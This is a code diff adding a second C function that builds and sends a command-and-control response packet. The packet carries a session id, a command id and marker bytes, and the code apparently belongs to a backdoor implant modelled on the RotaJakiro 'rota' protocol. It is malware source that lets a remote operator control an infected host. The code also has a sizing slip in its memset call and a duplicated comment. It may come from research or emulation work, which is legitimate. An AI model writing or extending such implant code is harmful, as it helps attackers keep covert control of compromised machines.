@@ -242,3 +242,31 @@ void build_c2_response(char *buffer, char *cmd_id, int sock){
     free(rota_resp_pkt);
     close(sock);
 }
+
+// TODO - clean up for one response function
+void build_c2_response2(char *buffer, int buffer_size, char *cmd_id, int sock){
+    char *rota_resp_pkt = initial_rota_pkt();
+
+    // correct length of payload on buffer
+    int buffer_len = buffer_size;
+
+    // bytes 4->8 session id
+    memcpy(&rota_resp_pkt[4], sessionId, sizeof(sessionId));
+
+    memcpy(&rota_resp_pkt[8], &buffer_len, 4);
+
+    // update cmd_id in response packet
+    memcpy(&rota_resp_pkt[14], cmd_id, 4);
+    // update cmd_id in response packet
+    memcpy(&rota_resp_pkt[19], marker_1, sizeof(marker_1));
+
+    // reallocate space from 82 byte header + response "body"
+    rota_resp_pkt = realloc(rota_resp_pkt, (82 + buffer_len));
+    // zero out new realloc'd data
+    memset(&rota_resp_pkt[82], 0, strlen(buffer));
+    memcpy(&rota_resp_pkt[82], buffer, buffer_len);
+
+    send(sock, rota_resp_pkt, (82 + buffer_len), 0);
+    free(rota_resp_pkt);
+    close(sock);
+}
